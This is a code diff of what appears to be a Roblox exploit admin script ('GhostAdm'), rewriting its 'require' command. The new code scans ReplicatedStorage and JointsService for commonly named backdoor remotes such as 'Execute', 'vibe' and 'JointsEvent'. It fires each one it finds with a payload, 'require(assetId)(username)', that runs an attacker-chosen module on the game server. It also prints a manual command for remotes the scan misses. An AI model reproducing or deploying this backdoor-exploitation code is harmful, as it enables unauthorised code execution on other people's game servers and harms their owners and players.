@@ -14135,18 +14135,52 @@ addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
 end)
 
 addcmd("require", {}, function(args, speaker)
-    local input = args[1]
-    
-    -- Nmbrsssz
-    local assetId = tonumber(input)
-    
-    if assetId then
-        -- Installation
-        -- It als-als...also passes your username
-        require(assetId)(speaker.Name)
-    else
-        -- Err
-        notify("Error", "Require expects an Asset ID number!")
+    local assetId = tonumber(args[1])
+    if not assetId then
+        return getgenv().execCmd("notify [GhostAdm] Please provide an Asset ID argument!")
+    end
+
+    getgenv().execCmd("notify [GhostAdm] Scanning for accessible backend nodes...")
+
+    -- DEFINE KNOWN VULNERABILITY SIGNATURES
+    -- FE bypass yeah
+    local potentialRemotes = {
+        {Path = game:GetService("ReplicatedStorage"), Name = "Handshake", Args = function(code) return code end},
+        {Path = game:GetService("ReplicatedStorage"), Name = "RemoteEvent", Args = function(code) return code end},
+        {Path = game:GetService("ReplicatedStorage"), Name = "Execute", Args = function(code) return code end},
+        {Path = game:GetService("ReplicatedStorage"), Name = "vibe", Args = function(code) return "run", code end},
+        {Path = game:GetService("ReplicatedStorage"), Name = "MainRemote", Args = function(code) return code end},
+        {Path = game:GetService("JointsService"), Name = "JointsEvent", Args = function(code) return code end},
+    }
+
+    -- ENCODE THE SERVER EXECUTION PAYLOAD
+    -- This tells the server to load your modules and passes your local name as the activator string
+    local targetServerCode = string.format("require(%d)('%s')", assetId, speaker.Name)
+    local nodeFound = false
+
+    -- SCAN AND DEPLOY
+    for _, node in ipairs(potentialRemotes) do
+        if node.Path then
+            local targetRemote = node.Path:FindFirstChild(node.Name)
+            if targetRemote and (targetRemote:IsA("RemoteEvent") or targetRemote:IsA("RemoteFunction")) then
+                nodeFound = true
+                task.spawn(function()
+                    if targetRemote:IsA("RemoteEvent") then
+                        -- Destructures custom args functions dynamically
+                        targetRemote:FireServer(node.Args(targetServerCode))
+                    elseif targetRemote:IsA("RemoteFunction") then
+                        targetRemote:InvokeServer(node.Args(targetServerCode))
+                    end
+                end)
+                getgenv().execCmd(string.format("notify [SSRequire] Target payload deployed through node: %s", node.Name))
+            end
+        end
+    end
+
+    -- LOG FALLBACK ACTIONS IF AUTOMATION SCAN FAILS
+    if not nodeFound then
+        getgenv().execCmd("notify [SSRequire] No default backdoor targets discovered. Checking console.")
+        print("[GhostAdm] Failed to auto-locate common backdoors. If you know the remote path, manually run: game.ReplicatedStorage.YourRemote:FireServer(\"require(" .. assetId .. ")('" .. speaker.Name .. "')\")")
     end
 end)
 
